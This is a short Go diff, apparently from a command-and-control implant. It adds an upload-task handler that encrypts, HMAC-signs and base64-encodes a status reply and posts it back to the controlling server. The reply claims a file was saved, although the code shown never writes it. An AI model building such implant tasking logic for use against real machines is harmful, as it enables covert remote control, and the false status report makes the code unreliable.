@@ -111,6 +111,16 @@ func Start() {
 			dataStart := dataLenStart + 4
 			data := payload[dataStart : uint32(dataStart)+uint32(dataLen)]
 
+			println("got file name ", name," with data ", string(data))
+
+			responseTaskPayload := "saved file to "+string(name)
+			taskResp := PackResponse(i, []byte(responseTaskPayload), tid)
+
+			dataEnc := enc.AESCbcEncrypt(taskResp)
+			enc.HMACPackAddHmac(&dataEnc)
+			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+			println(taskRestEnc)
+			h.Post([]byte(taskRestEnc))
 
 		case internal.KILL:
 			println("\n->",tcode)
